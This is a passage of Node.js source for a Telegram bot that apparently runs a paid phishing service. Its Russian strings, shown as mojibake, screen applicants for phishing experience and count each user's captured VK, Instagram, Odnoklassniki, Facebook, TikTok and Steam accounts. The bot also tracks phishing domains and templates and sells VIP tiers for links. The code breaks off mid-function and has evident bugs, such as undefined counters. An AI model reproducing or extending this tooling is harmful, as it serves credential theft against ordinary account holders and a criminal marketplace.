const bot = require('./createBot')
const adminCommands = require('./adminCommands')
const promocode = require('./database/models/promo')
const data = require('./database/models/userData')
const account = require('./database/models/account')
const link = require('./database/models/link')
const isAuth = require('./middleware/AuthCheck')
const {
    GetStringDate,
    GetDaysCount,
    VipCheck
} = require('./server/tools')
const {
    vip,
    menuList
} = require('./objects')

function ban(reason) {
    // console.log('b')
}

function edit(type) {
    // console.log('e')
}
bot.onText(/\/start/, (msg) => {
    isAuth(msg)
})
bot.onText(/–ü–æ–¥–∞—Ç—å –∑–∞—è–≤–∫—É/, async (msg) => {
    if (isAuth) {
        bot.sendMessage(msg.chat.id, '1. –ë—ã–ª –ª–∏ —É —Ç–µ–±—è –æ–ø—ã—Ç –≤ —Ñ–∏—à–∏–Ω–≥–µ?', {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "–î–∞",
                        callback_data: "experiance_true"
                    }, {
                        text: "–ù–µ—Ç",
                        callback_data: "experiance_false"
                    }],
                ]
            }
        })
    }
})
bot.onText(/–ù–∞–ø–∏—Å–∞—Ç—å –∞–¥–º–∏–Ω—É/, (msg) => {
    bot.sendMessage(msg.chat.id, '–°–≤—è–∑–∞—Ç—å—Å—è —Å –∞–¥–º–∏–Ω–æ–º –º–æ–∂–Ω–æ —Ç—É—Ç üëâüèª ' + process.env.Admin)
})
bot.onText(/üë§ –ú–æ–π –ø—Ä–æ—Ñ–∏–ª—å/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        let today = 0,
            week = 0,
            month = 0
        const accounts = await account.find({
            tg_id: msg.chat.id
        })
        accounts.map(account => {
            let x = GetDaysCount(account.date)
            if (x >= 0 && x <= 1) {
                today++
                week++
                month++
            }
            if (x > 1 && x <= 7) {
                week++
                month++
            }
            if (x > 7 && x <= 30) {
                month++
            }
        })
        let admin = '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å'
        if (user.vip) {
            admin = 'VIP –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å'
        }
        if (user.isAdmin) {
            admin = '–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä'
        }
        user.links_info.map(link => {
            visit++
            if (link.auth_visit) {
                authVist++
            }
        })
        await bot.sendMessage(msg.chat.id, `üë§ –ú–æ–π –ø—Ä–æ—Ñ–∏–ª—å\n\nüÜî ID: <code>${msg.chat.id}</code>\nüéó –°—Ç–∞—Ç—É—Å: ${admin}\n\nüí∏ –ë–∞–ª–∞–Ω—Å: ${user.balance}‚ÇΩ\n\n‚òòÔ∏è –ê–∫–∫–∞—É–Ω—Ç–æ–≤ –∑–∞ —Å–µ–≥–æ–¥–Ω—è: ${today}\n‚òòÔ∏è –ê–∫–∫–∞—É–Ω—Ç–æ–≤ –∑–∞ –Ω–µ–¥–µ–ª—é: ${week}\n‚òòÔ∏è –ê–∫–∫–∞—É–Ω—Ç–æ–≤ –∑–∞ –º–µ—Å—è—Ü: ${month}\n‚òòÔ∏è –ê–∫–∫–∞—É–Ω—Ç–æ–≤ –∑–∞ –≤—Å—ë –≤—Ä–µ–º—è: ${accounts.length}\n\nüëÄ –ü–µ—Ä–µ—Ö–æ–¥–æ–≤ –∑–∞ –≤—Å—ë –≤—Ä–µ–º—è: ${accounts.length}\nüîê –ü–µ—Ä–µ—Ö–æ–¥–æ–≤ –Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é –∑–∞ –≤—Å—ë –≤—Ä–µ–º—è: ${accounts.length}`, {
            parse_mode: 'HTML'
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/üë• –ú–æ–∏ –∞–∫–∫–∞—É–Ω—Ç—ã/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `üëÄ–ü–æ–∂–∞–ª—É–π—Å—Ç–∞ –≤—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –∞–∫–∫–∞—É–Ω—Ç–æ–≤`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: '–í–∫–æ–Ω—Ç–∞–∫—Ç–µ',
                        callback_data: 'showAccs_vk'
                    }, {
                        text: 'Instagram',
                        callback_data: 'showAccs_inst'
                    }],
                    [{
                        text: '–û–¥–Ω–æ–∫–ª–∞—Å—Å–Ω–∏–∫–∏',
                        callback_data: 'showAccs_ok'
                    }, {
                        text: 'Facebook',
                        callback_data: 'showAccs_fb'
                    }],
                    [{
                        text: 'TikTok',
                        callback_data: 'showAccs_tt'
                    }, {
                        text: 'Steam',
                        callback_data: 'showAccs_st'
                    }],
                    [{
                        text: '‚û°Ô∏è',
                        callback_data: 'nextAccsReplay_3'
                    }]
                ]
            }
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/üîó –ú–æ–∏ —Å—Å—ã–ª–∫–∏/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        if (user.vip) {
            bot.sendMessage(msg.chat.id, `üòª –ü–æ–∂–∞–ª—É–π—Å—Ç–∞ –≤—ã–±–µ—Ä–∏—Ç–µ –∫–∞—Ç–µ–≥–æ—Ä–∏—é`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '–í–∫–æ–Ω—Ç–∞–∫—Ç–µ',
                            callback_data: 'showLinks_vk'
                        }, {
                            text: 'Instagram',
                            callback_data: 'showLinks_inst'
                        }],
                        [{
                            text: '–û–¥–Ω–æ–∫–ª–∞—Å—Å–Ω–∏–∫–∏',
                            callback_data: 'showLinks_ok'
                        }, {
                            text: 'Facebook',
                            callback_data: 'showLinks_fb'
                        }],
                        [{
                            text: 'TikTok',
                            callback_data: 'showLinks_tt'
                        }, {
                            text: 'Steam',
                            callback_data: 'showLinks_st'
                        }],
                        [{
                            text: '‚û°Ô∏è',
                            callback_data: 'nextLinksReplay_3'
                        }]
                    ]
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, `–£ –≤–∞—Å –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ <b>VIP</b> —Å—Ç–∞—Ç—É—Å–∞üòî\n–í—ã –º–æ–∂–µ—Ç–µ –ø—Ä–∏–æ–±—Ä–µ—Å—Ç–∏ –µ–≥–æ –ø–æ–ø–æ–ª–Ω–∏–≤ –±–∞–ª–∞–Ω—Å –∏ –Ω–∞–∂–∞–≤ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ‚§µÔ∏è`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '–ö—É–ø–∏—Ç—å VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/üìä –û –±–æ—Ç–µ/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        const users = await data.find(),
            accounts = await account.find(),
            links = await link.find();
        let reg_today = 0,
            reg_week = 0,
            reg_month = 0,
            reg_alltime = users.length,
            sites = links.length,
            pattern = 0,
            accs_today = 0,
            accs_week = 0,
            accs_month = 0,
            accs_alltime = accounts.length,
            vip_1 = 0,
            vip_2 = 0,
            vip_3 = 0,
            vip_4 = 0;
        users.map(e => {
            let x = GetDaysCount(e.reg_date)
            if (e.vip) {
                if (e.vipType == '1') {
                    vip_1++
                }
                if (e.vipType == '2') {
                    vip_2++
                }
                if (e.vipType == '3') {
                    vip_3++
                }
                if (e.vipType == '4') {
                    vip_4++
                }
            }
            if (x >= 0 && x <= 1) {
                reg_today++
                reg_week++
                reg_month++
            }
            if (x > 1 && x <= 7) {
                reg_week++
                reg_month++
            }
            if (x > 7 && x <= 30) {
                reg_month++
            }
        })
        links.map(e => {
            e.query.map(i => {
                pattern++
            })
        })
        accounts.map(account => {
            let x = GetDaysCount(account.date)
            if (x >= 0 && x <= 1) {
                accs_today++
                accs_week++
                accs_month++
            }
            if (x > 1 && x <= 7) {
                accs_week++
                accs_month++
            }
            if (x > 7 && x <= 30) {
                accs_month++
            }
        })
        bot.sendMessage(msg.chat.id, `üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞\n\nüòª–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–π –≤ –±–æ—Ç–µ –∑–∞ —Å–µ–≥–æ–¥–Ω—è: ${reg_today}\nüòª–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–π –≤ –±–æ—Ç–µ –∑–∞ –Ω–µ–¥–µ–ª—é: ${reg_week}\nüòª–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–π –≤ –±–æ—Ç–µ –∑–∞ –º–µ—Å—è—Ü: ${reg_month}\nüòª–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–π –≤ –±–æ—Ç–µ –∑–∞ –≤—Å–µ –≤—Ä–µ–º—è: ${reg_alltime}\n\nüë®‚Äçüë©‚Äçüëß‚Äçüë¶ –ü–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –≤ –ù–æ–≤–æ—Å—Ç—è—Ö: ${await bot.getChatMemberCount('@ssniffer')}\nüë®‚Äçüë©‚Äçüëß‚Äçüë¶ –ü–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –≤ –ß–∞—Ç–µ: ${await bot.getChatMemberCount('@sniffer_chat')}\nüë®‚Äçüë©‚Äçüëß‚Äçüë¶ –ü–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –≤ –û—Ç–∑—ã–≤–∞—Ö: ${await bot.getChatMemberCount('@ssniffero')}\n\nüìé –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–æ–º–µ–Ω–æ–≤: ${sites}\nüìÅ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —à–∞–±–ª–æ–Ω–æ–≤: ${pattern}\n\nüçÄ –ê–∫–∫–∞—É–Ω—Ç–æ–≤ –∑–∞ —Å–µ–≥–æ–¥–Ω—è: ${accs_today}\nüçÄ –ê–∫–∫–∞—É–Ω—Ç–æ–≤ –∑–∞ –Ω–µ–¥–µ–ª—é: ${accs_week}\nüçÄ –ê–∫–∫–∞—É–Ω—Ç–æ–≤ –∑–∞ –º–µ—Å—è—Ü: ${accs_month}\nüçÄ –ê–∫–∫–∞—É–Ω—Ç–æ–≤ –∑–∞ –≤—Å–µ –≤—Ä–µ–º—è: ${accs_alltime}\n\nüëë –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ [‚õè–†–∞–±–æ—á–∏–π]: ${vip_1}\nüëë –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ [ü§¥üèª–õ—é–±–∏—Ç–µ–ª—å]: ${vip_2}\nüëë –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ [ü•∑–ü—Ä–æ—Ñ–∏]: ${vip_3}\nüëë –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ [üëÄ–ü—Ä–µ–¥–ø—Ä–µ–Ω–∏–º–∞—Ç–µ–ª—å]: ${vip_4}\n\nüìÖ –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º —Å 2021 –≥–æ–¥–∞.`, {
            parse_mode: 'HTML'
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/üëë VIP –°—Ç–∞—Ç—É—Å/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        if (user.vip) {
            bot.sendMessage(msg.chat.id, `ü§¥üèª –£ –≤–∞—Å –µ—Å—Ç—å <b>VIP</b> —Å—Ç–∞—Ç—É—Å [${vip[Number(user.vipType)].name}].\n\n‚è≥ VIP –∑–∞–∫–æ–Ω—á–∏—Ç—Å—è —á–µ—Ä–µ–∑‚§µÔ∏è \n‚è± ${GetStringDate(new Date(user.vipDate))}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '–ü—Ä–æ–¥–ª–∏—Ç—å VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        } else {
            bot.sendMessage(msg.chat.id, `–£ –≤–∞—Å –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ <b>VIP</b> —Å—Ç–∞—Ç—É—Å–∞üòî\n–í—ã –º–æ–∂–µ—Ç–µ –ø—Ä–∏–æ–±—Ä–µ—Å—Ç–∏ –µ–≥–æ –ø–æ–ø–æ–ª–Ω–∏–≤ –±–∞–ª–∞–Ω—Å –∏ –Ω–∞–∂–∞–≤ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ‚§µÔ∏è`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '–ö—É–ø–∏—Ç—å VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/‚ùì –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `<b>‚ùì –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</b>\n\n<b>‚ô¶Ô∏è –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä</b> - ${process.env.Admin}  (–ü–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º)\n\n–û—Ç–≤–µ—Ç—ã –Ω–∞ —Å–∞–º—ã–µ —á–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã –Ω–∞–ø–∏—Å–∞—Ç—ã –≤ —Å—Ç–∞—Ç—å–µ\nhttps://teletype.in/@ssniffer/Nj73iy7Ps7z`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: '–ü—Ä–∞–≤–∏–ª–∞',
                        url: 'https://t.me/joinchat/1yuUy9l4yYQ2N2My'
                    }],
                    [{
                        text: '‚ö°Ô∏è –ù–æ–≤–æ—Å—Ç–∏',
                        url: process.env.Channel
                    }, {
                        text: 'üë• –ß–∞—Ç',
                        url: process.env.Chat
                    }]
                ]
            },
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/üéÅ –ü–æ–ª—É—á–∏—Ç—å –±–æ–Ω—É—Å/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `üéÅ –ü–æ–ª—É—á–∏—Ç—å –±–æ–Ω—É—Å\n\n–ß—Ç–æ –¥–∞—ë—Ç –±–æ–Ω—É—Å?\n- –ü—Ä–∏ –ø–µ—Ä–≤–æ–º –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–∏, (35‚ÇΩ –≤ –ü–æ–¥–∞—Ä–æ–∫üéÅüòª)\n\n–î–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –±–æ–Ω—É—Å –≤—ã –¥–æ–ª–∂–Ω—ã –æ—Å—Ç–∞–≤–∏—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã–π –æ—Ç–∑—ã–≤ –≤ –Ω–∞—à–µ–π –≥—Ä—É–ø–ø–µ (https://t.me/ssniffero). –û—Ç–∑—ã–≤ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–æ–¥–∫—Ä–µ–ø–ª–µ–Ω —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–º –∏–∑ —Å–≤–æ–µ–≥–æ –ø—Ä–æ—Ñ–∏–ª—è, —á—Ç–æ–±—ã –æ—Ç–∑—ã–≤ –Ω–µ —É–¥–∞–ª–∏–ª–∏.\n–ë–æ–Ω—É—Å —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ 1 —Ä–∞–∑, –ø–æ–≤—Ç–æ—Ä–Ω–æ –µ–≥–æ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–ª—å–∑—è\n\nüòª –ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –±–æ–Ω—É—Å –Ω–∞ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç - –Ω–∞–ø–∏—à–∏—Ç–µ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É (@vincicash_s).`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'üìú –û—Å—Ç–∞–≤–∏—Ç—å –æ—Ç–∑—ã–≤',
                        url: 'https://t.me/ssniffero'
                    }, {
                        text: 'üéÅ –ó–∞–±—Ä–∞—Ç—å –±–æ–Ω—É—Å',
                        url: 'https://t.me/vincicash_s'
                    }]
                ]
            },
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/üí∏ –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `üí∏ –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞\n\n–í–∞—à –∞–∫—Ç—É–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å: ${user.balance} RUB\n\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è ‚Äî 100 —Ä—É–±–ª–µ–π\n\nüíö –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ QIWI\nüíú –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ –ÆMoney\nüß° –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ WebMoney\n\n–ù–µ –Ω–∞—à–ª–∏ –¥–ª—è —Å–µ–±—è —É–¥–æ–±–Ω–æ–≥–æ —Å–ø–æ—Å–æ–±–∞ –æ–ø–ª–∞—Ç—ã? –ù–∞–ø–∏—à–∏—Ç–µ –Ω–∞—à–µ–º—É –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª—é –ø–æ –∫–æ–Ω—Ç–∞–∫—Ç–∞–º –Ω–∏–∂–µ –∏ –º—ã —á—Ç–æ-–Ω–∏–±—É–¥—å –ø—Ä–∏–¥—É–º–∞–µ–º –¥–ª—è –í–∞—Å\n–ü—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª—å: @vincicash_s\n\n–ö–∞–∫–æ–π  VIP —Å—Ç–∞—Ç—É—Å –ª—É—á—à–µ –≤–∑—è—Ç—å?\nhttps://teletype.in/@ssniffer/howbuy\n\n–ê —Ç–∞–∫ –∂–µ –µ—Å–ª–∏ —É –≤–∞—Å –µ—Å—Ç—å —Å–æ–º–Ω–µ–Ω–∏—è –ø–æ –Ω–∞—à–µ–º—É –±–æ—Ç—É –º–æ–∂–µ—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –æ—Ç–∑—ã–≤—ã –ø–æ –∫–Ω–æ–ø–∫–µ –Ω–∏–∂–µ‚§µÔ∏è`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'üí∞–ü–æ–ø–æ–ª–Ω–∏—Ç—å –ë–∞–ª–∞–Ω—Å',
                        url: 'https://t.me/VinciCash_S'
                    }],
                    [{
                        text: 'üóÇ –ò—Å—Ç–æ—Ä–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π',
                        callback_data: 'transactions'
                    }, {
                        text: 'üçÄ –û—Ç–∑—ã–≤—ã',
                        url: 'https://t.me/ssniffero'
                    }]
                ]
            },
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/üéü –ü—Ä–æ–º–æ-–ö–æ–¥—ã/, async msg => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `üéü –ü—Ä–æ–º–æ-–ö–æ–¥—ã\n\n–ü—Ä–æ–º–æ-–∫–æ–¥—ã –≤—ã–¥–∞—é—Ç—å—Å—è —Ç–æ–ª—å–∫–æ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–µ–π.\n–ö–æ–¥ –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ü–µ–Ω–Ω–æ—Å—Ç–∏: VIP, –î–æ–º–µ–Ω, –ü–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –º–Ω–æ–≥–æ–µ –¥—Ä—É–≥–æ–µ...\n\n–ì–¥–µ –¥–æ—Å—Ç–∞—Ç—å –ü—Ä–æ–º–æ-–ö–æ–¥—ã?\n–ú—ã —á–∞—Å—Ç–æ –ø—É–±–ª–∏–∫—É–µ–º –ü—Ä–æ–º–æ-–ö–æ–¥—ã, –≤ –Ω–∞—à–µ–º –ù–æ–≤–æ—Å—Ç–Ω–æ–º –∫–∞–Ω–∞–ª–µ.\n(${process.env.Channel})\n\n–ß—Ç–æ –±—ã –∑–∞–±—Ä–∞—Ç—å –ü—Ä–æ–º–æ-–ö–æ–¥ –ø–µ—Ä–≤—ã–º,\n–°–æ–≤–µ—Ç—É–µ–º –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –∫–∞–Ω–∞–ª, –∏ –≤–∫–ª—é—á–∏—Ç—å –∫–æ–ª–æ–∫–æ–ª—å—á–∏–∫üîî`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: '–í–≤–µ—Å—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥',
                        callback_data: 'promo'
                    }]
                ]
            },
            parse_mode: 'html',
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/üë®‚Äçüë©‚Äçüëß‚Äçüë¶ –ú–æ–∏ —Ä–µ—Ñ–µ—Ä–∞–ª—ã/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        const ref = await data.find({
            ref_id: msg.chat.id
        })
        bot.sendMessage(msg.chat.id, `üë®‚Äçüë©‚Äçüëß‚Äçüë¶ –ú–æ–∏ —Ä–µ—Ñ–µ—Ä–∞–ª—ã\n\n–í–∞—à —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å: ${user.ref_balance||0} RUB\n\n–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–∞—à–∏—Ö —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: ${ref.length||0}\n\n–ö–∞–∂–¥—ã–π –í–∞—à —Ä–µ—Ñ–µ—Ä–∞–ª –ø—Ä–∏ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–∏ —Å–≤–æ–µ–≥–æ –±–∞–ª–∞–Ω—Å–∞ –±—É–¥–µ—Ç –Ω–∞—á–∏—Å–ª—è—Ç—å –í–∞–º –Ω–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å +20% –æ—Ç —Å—É–º–º—ã.\n–ß—Ç–æ –º–æ–∂–Ω–æ –±—É–¥–µ—Ç —Å–¥–µ–ª–∞—Ç—å —Å —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–º –±–∞–ª–∞–Ω—Å–æ–º?\n\n–ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –µ–≥–æ –≤ –æ–±—â–∏–π –±–∞–ª–∞–Ω—Å –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–∞ –ø–æ–∫—É–ø–∫—É –≤–∏–ø –∏ –ø—Ä–æ—á–µ–≥–æ.\n\n–ü—Ä–∏ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–∏ —Å—É–º–º—ã –±–æ–ª—å—à–µ 200 —Ä—É–±–ª–µ–π –í—ã –º–æ–∂–µ—Ç–µ –∑–∞–ø—Ä–æ—Å–∏—Ç—å –≤—ã–ø–ª–∞—Ç—É –Ω–∞ –í–∞—à Qiwi –∫–æ—à–µ–ª–µ–∫ –∏–ª–∏ –Ω–∞ –ö–∞—Ä—Ç—É\n\n–ß—Ç–æ–±—ã –∑–∞–ø—Ä–æ—Å–∏—Ç—å –≤—ã–ø–ª–∞—Ç—É –∏–ª–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –≤ –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞, –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞—à–µ–º—É\n–ü—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª—é: @vincicash_s\n\n–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞üîó\n<a>https://t.me/${(await bot.getMe()).username}?start=${user.tg_id}</a>\n\n–ö–ª—é—á –¥–ª—è –≤—ã–ø–ª–∞—Ç\n<code>${user.tg_id}</code>`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: '–ó–∞–ø—Ä–æ—Å–∏—Ç—å –≤—ã–ø–ª–∞—Ç—É',
                        url: 'https://t.me/VinciCash_S'
                    }]
                ]
            },
            parse_mode: 'html',
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})

bot.on('message', async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.edit_mode) {
        if (!menuList.includes(msg.text)) {
            await promocode.findOne({
                promo: msg.text
            }).then(async e => {
                if (e) {
                    let usedBy = e.usedBy,
                        used = false
                    usedBy.map(i => {
                        if (i.tg_id == msg.chat.id) {
                            used = true
                        }
                    })
                    if (e.activations < e.mactivation && !used) {
                        usedBy.push({
                            tg_id: msg.chat.id,
                            login: msg.chat.username,
                            date: new Date()
                        })
                        if(e.type =='balance'){
                            await data.updateOne({
                                tg_id: msg.chat.id
                            }, {
                                balance: user.balance + Number(e.value),
                                transactions: [...user.transactions, {
                                    type: '–ü—Ä–æ–º–æ–∫–æ–¥',
                                    value: '+' + e.value,
                                    date: new Date()
                                }]
                            }, {
                                upsert: true
                            })
                        }else{
                            let date = new Date()
                            date.setHours(date.getHours() + Number(e.value))
                            await data.updateOne({
                                tg_id: msg.chat.id
                            }, {
                                vip: true,
                                vipDate: date,
                                vipType: 1,
                            }, {
                                upsert: true
                            })
                        }
                        
                        await promocode.updateOne({
                            promo: msg.text
                        }, {
                            activations: e.activations + 1,
                            usedBy: usedBy
                        }, {
                            upsert: true
                        }).then((data2) => {
                            if (data2) {
                                bot.sendMessage(msg.chat.id, `‚úÖ –ü—Ä–æ–º–æ–∫–æ–¥ ${msg.text} —É—Å–ø–µ—à–Ω–æ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω, ${e.type =='balance'?'–≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ –Ω–∞ –±–∞–ª–∞–Ω—Å '+e.value+' RUB': '–í—ã –ø–æ–ª—É—á–∏–ª–∏ '+e.value+' —á–∞—Å–æ–≤ VIP —Å—Ç–∞—Ç—É—Å–∞'}`, {}).then(async it => {
                                    const x = await data.updateOne({
                                        tg_id: msg.chat.id
                                    }, {
                                        edit_mode: false,
                                        edit_modeType: ''
                                    }, {
                                        upsert: true
                                    })
                                })
                            }
                        }).catch(err => {
                            bot.sendMessage(msg.chat.id, `‚ùå –ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫ üò•, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ\n–î–ª—è –≤—ã—Ö–æ–¥–∞ –∏–∑ —Ä–µ–∂–∏–º–∞ –≤–≤–æ–¥–∞ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ`, {
                                reply_markup: {
                                    inline_keyboard: [
                                        [{
                                            text: '–í—ã–π—Ç–∏',
                                            callback_data: 'remove_editmode'
                                        }]
                                    ]
                                }
                            })
                        });
                    } else {
